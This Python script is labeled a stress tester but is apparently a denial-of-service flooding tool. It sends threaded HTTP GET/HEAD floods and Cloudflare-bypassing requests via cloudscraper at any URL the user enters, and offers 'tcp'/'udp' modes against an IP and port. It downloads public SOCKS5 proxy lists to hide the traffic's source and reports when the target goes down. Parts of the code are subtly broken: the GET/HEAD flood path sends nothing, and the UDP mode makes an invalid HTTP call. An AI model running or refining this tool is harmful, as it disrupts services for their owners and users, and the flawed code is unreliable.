import cloudscraper
import httpx
import socket
import threading
import time
import requests
import sys
import os
from colorama import Fore, Style, init

init()

print("Layer 7: get, head, cfb")
print("Layer 4: tcp, udp")
protocol = input("Enter the method to use:").lower()

if protocol in ["get", "head", "cfb"]:
    url = input("Enter the website URL (including http or https): ")
elif protocol in ["tcp", "udp"]:
    ip = input("Enter the IP address of the server: ")
    port = int(input("Enter the port number: "))

num_threads = int(input("Enter the number of threads to use: "))
duration = int(input("Enter the duration of the stress test in seconds: "))

use_proxies = None

def ask_for_proxies():
    global use_proxies
    while use_proxies not in ["y", "n"]:
        use_proxies = input("Do you want to use proxies? (y/n): ").lower()

def download_proxies():
    global proxy_list
    print("Downloading public proxies...")
    urls = [
        "https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/socks5.txt",
        "https://raw.githubusercontent.com/officialputuid/KangProxy/KangProxy/socks5/socks5.txt"
    ]

    proxy_list = []
    for url in urls:
        try:
            response = requests.get(url, timeout=10)
            if response.status_code == 200:
                proxies = response.text.strip().split("\n")
                proxy_list.extend(proxies)
        except Exception as e:
            print(f"Failed to download proxies from {url}: {e}")

    proxy_list = list(set(proxy_list))
    with open("proxies.txt", "w") as proxy_file:
        proxy_file.write("\n".join(proxy_list))

def check_proxy(proxy):
    try:
        proxy_address = proxy.split(":")[0]
        proxy_port = int(proxy.split(":")[1])

        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(5)
        result = sock.connect_ex((proxy_address, proxy_port))

        if result == 0:
            return True
        else:
            return False
    except:
        return False

def check_proxies():
    global proxy_list
    print("Checking proxies...")
    checked_proxies = []
    proxy_count = len(proxy_list)

    for i, proxy in enumerate(proxy_list):
        sys.stdout.write(f"\rProxy checking progress: {i + 1}/{proxy_count}")
        sys.stdout.flush()

        if check_proxy(proxy):
            checked_proxies.append(proxy)

    print("\nProxy checking done.")
    proxy_list = checked_proxies
    with open("proxies.txt", "w") as proxy_file:
        proxy_file.write("\n".join(proxy_list))

if "-download" in sys.argv:
    download_proxies()
    sys.exit()

if "-check" in sys.argv:
    check_proxies()
    sys.exit()

if use_proxies is None:
    ask_for_proxies()

packet_size = 65507 if protocol == "udp" else 65535

packet_counter = 0
packet_counter_lock = threading.Lock()

def stress_test(thread_id):
    global packet_counter

    if protocol == "cfb":
        client = cloudscraper.create_scraper()
    else:
        if use_proxies == "y":
            proxy_address = proxy_list[thread_id % len(proxy_list)]
            proxy = {"http": f"http://{proxy_address}", "https": f"https://{proxy_address}"}
            client = httpx.Client(proxies=proxy)
        else:
            client = httpx.Client()

    start_time = time.time()
    last_print_time = start_time - 9
    if thread_id == 0:
        if protocol == "cfb":
            print(Fore.YELLOW + f"Stress testing started on {url} using Cloudscraper successfully!" + Style.RESET_ALL)
        elif protocol in ["get", "head"]:
            print(Fore.YELLOW + f"Stress testing started on {url} with proxies: {use_proxies}" + Style.RESET_ALL)
        elif protocol in ["tcp", "udp"]:
            print(Fore.YELLOW + f"Stress testing started on {ip}:{port} with proxies: {use_proxies}" + Style.RESET_ALL)

    while time.time() - start_time < duration:
        if protocol == "cfb":
            send_request(client)
            with packet_counter_lock:
                packet_counter += 1
        elif protocol in ["get", "head", "tcp", "udp"]:
            send_packet(client)
            with packet_counter_lock:
                packet_counter += 1
        if thread_id == 0 and time.time() - last_print_time >= 10:
            with packet_counter_lock:
                if protocol == "cfb":
                    try:
                        response_start_time = time.time()
                        response = client.get(url)
                        response_end_time = time.time()
                        response_time = round((response_end_time - response_start_time) * 1000, 2)
                        print(Fore.GREEN + f"Website is up. Response time: {response_time} ms." + Style.RESET_ALL)
                    except Exception as e:
                        print(Fore.RED + f"Website is down." + Style.RESET_ALL)
                elif protocol in ["get", "head"]:
                    try:
                        response_start_time = time.time()
                        response = client.get(url) if protocol == "get" else client.head(url)
                        response_end_time = time.time()
                        response_time = round((response_end_time - response_start_time) * 1000, 2)
                        print(Fore.GREEN + f"Website is up. Response time: {response_time} ms." + Style.RESET_ALL)
                    except Exception as e:
                        print(Fore.RED + f"Website is down." + Style.RESET_ALL)
                elif protocol in ["tcp", "udp"]:
                    print(f"Sent {packet_counter} packets to {ip}:{port}")
                last_print_time = time.time()

def send_request(client):
    try:
        if protocol == "cfb":
            response = client.get(url)
        elif protocol == "get":
            response = client.get(url)
        elif protocol == "head":
            response = client.head(url)
    except Exception as e:
        pass  # Suppress error messages

def send_packet(client):
    try:
        if protocol == "tcp":
            response = client.get(f"http://{ip}:{port}")
        elif protocol == "udp":
            response = client.get(f"udp://{ip}:{port}")
    except Exception as e:
        pass

threads = []
for i in range(num_threads):
    thread = threading.Thread(target=stress_test, args=(i,))
    thread.start()
    threads.append(thread)

for thread in threads:
    thread.join()

print(Fore.YELLOW + "Stress test ended." + Style.RESET_ALL)
